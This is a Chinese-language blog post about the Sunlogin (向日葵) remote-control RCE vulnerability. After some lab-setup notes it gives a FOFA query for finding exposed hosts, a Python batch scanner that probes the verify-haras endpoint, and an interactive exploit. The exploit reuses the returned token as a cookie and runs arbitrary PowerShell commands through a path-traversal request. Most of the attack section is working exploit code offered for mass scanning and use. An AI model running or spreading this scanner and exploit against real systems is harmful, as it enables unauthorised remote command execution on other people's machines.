
    注意：如业务使用到该程序，请下载最新版本或更新到最新版本 ！！！
    

# 环境搭建

## 网络联通性

测试发现虚拟机win7可以ping通真实主机，但真实主机无法ping通虚拟机时

在虚拟机中的高级防火墙中->启用入站规则->文件和打印机共享(回显请求 - ICMPv4-In)

![](./img/6180059338015491698.png)

开启后即可解决真实主机无法ping通虚拟机的问题

## 向日葵无法连上服务器

刚开始我们的向日葵一进去，左下角是红色的，显示连接失败，无法连接服务器

![](./img/8280312126252722311.png)

我们根据网上的教程修改了DNS服务器后重启，它变成了闪烁的正在连接，闪烁一段时候后就又变成了红色

![](./img/772323386838923355.png)

后来发现下载新版本的向日葵不会出现异常

![](./img/5185819766881187167.png)

# 向日葵RCE复现

想本地复现但因为安装后都显示服务器连接失败，因此不了了之

但忽然就想不能复现就尝试写一个向日葵RCE复现的攻击脚本

目前含有两个功能：

1.支持批量检测向日葵RCE漏洞

2.支持利用向日葵RCE漏洞

## 漏洞检测

首先对应的版本属性

    
    
    向日葵个人版   for Windows <= 11.0.0.33
    向日葵简约版   <= V1.0.1.43315（2021.12）

开放的端口默认在40000到65535

我们结合fofa语句尝试进行搜索

    
    
    app="向日葵-远程控制" && body="Verification failure"

这里放入检测脚本

    
    
    import requests
    import json
    
    
    timeout_seconds = 3  # 设置超时时间，单位为秒
    
    
    def check():
        def check_url(url):
            try:
                response = requests.get(url, timeout=timeout_seconds)
    
                if response.status_code == 200:
                    print(f"URL: {url} - 请求成功！")
                    print("回显内容：")
                    print(response.text)
                    with open("./successful_urls.txt", "a") as file:
                        file.write(url + "\n")
                        file.write(response.text+"\n")
                        file.write("-----"+"\n")
                else:
                    print(f"URL: {url} - 请求失败，状态码：{response.status_code}")
    
            except requests.Timeout:
                print(f"URL: {url} - 请求超时。")
            except requests.RequestException as e:
                print(f"URL: {url} - 请求发生异常：{e}")
    
        # 从文件读取URL并进行遍历检测
        with open(r"./urls.txt", "r") as file:
            for line in file:
                url = line.strip()  # 去除换行符和空格
                if("/cgi-bin/rpc?action=verify-haras" not in url):
                    url = url + "/cgi-bin/rpc?action=verify-haras"
                check_url(url)
    
    
    check()

![](./img/6318962229767444479.png)

这里需要注意我们放入urls.txt里面的格式

    
    
    http://ip:端口
    http://ip:端口
    ....

## 攻击利用

    
    
    def attack(url):
        def exp(url, ck, cmd):
            url = url+"/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20"+cmd
            timeout_seconds = 5  # 设置超时时间，单位为秒
    
            headers = {
                "Cookie": "CID=" + ck
            }
    
            try:
    
                response = requests.get(
                    url, headers=headers, timeout=timeout_seconds)
                if response.status_code == 200:
                    print("请求成功！")
                    print("回显内容：")
                    print(response.text)
                else:
                    print(f"请求失败，状态码：{response.status_code}")
    
            except requests.Timeout:
                print("请求超时。")
            except requests.RequestException as e:
                print(f"请求发生异常：{e}")
    
        # 从文件读取URL进行分组和提取
        text = check_url(url)
        # print(text)
        json_dict = json.loads(text)
        cookie = (json_dict["verify_string"])
        # print(cookie)
        while(True):
            cmd = input("请输入指令")
            exp(url, cookie, cmd)

![](./img/1900530767550867106.png)

